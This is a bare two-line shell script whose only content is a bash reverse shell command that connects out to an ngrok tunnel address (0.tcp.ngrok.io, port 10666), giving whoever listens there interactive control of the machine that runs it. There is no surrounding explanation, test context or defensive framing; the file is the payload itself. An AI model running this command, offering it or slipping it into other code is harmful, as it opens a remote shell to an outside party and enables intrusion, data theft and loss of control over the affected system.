#!/bin/sh
bash -i >& /dev/tcp/0.tcp.ngrok.io/10666 0>&1
